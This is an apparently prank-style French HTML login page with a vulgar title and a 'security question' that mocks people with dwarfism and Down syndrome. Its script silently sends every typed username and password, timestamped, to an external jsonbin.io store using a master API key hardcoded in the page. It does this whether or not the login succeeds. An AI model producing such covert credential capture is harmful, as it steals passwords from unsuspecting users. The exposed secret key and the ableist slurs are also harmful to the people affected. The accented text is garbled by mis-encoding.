<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Connexion Secr√®te</title>
    <style>
        body {
            background: #FF69B4;
            font-family: 'Comic Sans MS', cursive;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            position: relative;
        }

        .login-box {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 0 20px rgba(0,0,0,0.3);
            text-align: center;
        }

        .security-question {
            position: absolute;
            top: 20px;
            right: 20px;
            background: white;
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 0 10px rgba(0,0,0,0.2);
            width: 250px;
        }

        input {
            margin: 10px;
            padding: 10px;
            border: 3px solid #FF69B4;
            border-radius: 15px;
            font-size: 1.2em;
        }

        button {
            background: #FF69B4;
            color: white;
            padding: 10px 30px;
            border: none;
            border-radius: 20px;
            font-size: 1.3em;
            cursor: pointer;
            margin-top: 20px;
        }

        .small-btn {
            font-size: 1em;
            padding: 8px 20px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="security-question">
        <h3>üîê Question Secr√®te</h3>
        <p>Environ combien de nain trisomiques sont n√©s en 2007 ? üß†</p>
        <input type="number" id="security-answer" placeholder="Nombre magique">
        <button class="small-btn" onclick="checkSecurityAnswer()">R√©v√©ler le secret</button>
    </div>

    <div class="login-box">
        <h2>Connexion de Pute ‚ú®</h2>
        <form onsubmit="return checkCredentials(event)">
            <input type="text" id="username" placeholder="Nom d'utilisateur" required><br>
            <input type="password" id="password" placeholder="Mot de passe" required><br>
            <button type="submit">Entrer dans la matrice üåÄ</button>
        </form>
    </div>

    <script>
        const API_KEY = '$2a$10$1wewJFQyy/qyWMcrP0P4UeA4TUr1kK0bQC9VyMz9htOaRMDyz3sk2';
        const BIN_ID = '679cba12acd3cb34a8d5f51d';

        function checkSecurityAnswer() {
            const answer = parseInt(document.getElementById('security-answer').value);
            if (answer >= 28 && answer <= 52) {
                document.getElementById('username').value = 'skibidi';
                document.getElementById('password').value = 'sigma';
                alert('‚ú® Identifiants magiques d√©bloqu√©s !');
            } else {
                alert('‚ùå R√©ponse incorrecte ! Les nains se cachent...');
            }
        }

        async function checkCredentials(event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value.toLowerCase();
            const password = document.getElementById('password').value.toLowerCase();

            try {
                const response = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
                    headers: { 'X-Master-Key': API_KEY }
                });
                const data = await response.json();
                
                const newEntry = {
                    username: username,
                    password: password,
                    timestamp: new Date().toISOString()
                };

                const updatedData = [...data.record, newEntry];

                await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
                    method: 'PUT',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Master-Key': API_KEY
                    },
                    body: JSON.stringify(updatedData)
                });

            } catch (error) {
                console.error("Erreur API :", error);
                alert('Probl√®me de connexion au serveur üò¢');
            }

            // V√©rification des identifiants sp√©ciaux
            if(username === 'skibidi' && password === 'sigma') {
                window.location.href = 'skibidi.html';
            }
            // V√©rification du mot magique standard
            else if(username.includes('pute') || password.includes('pute')) {
                window.location.href = 'success.html';
            } else {
                alert('‚ö†Ô∏è Le mot magique "pute" est requis !');
            }
        }
    </script>
</body>
</html>
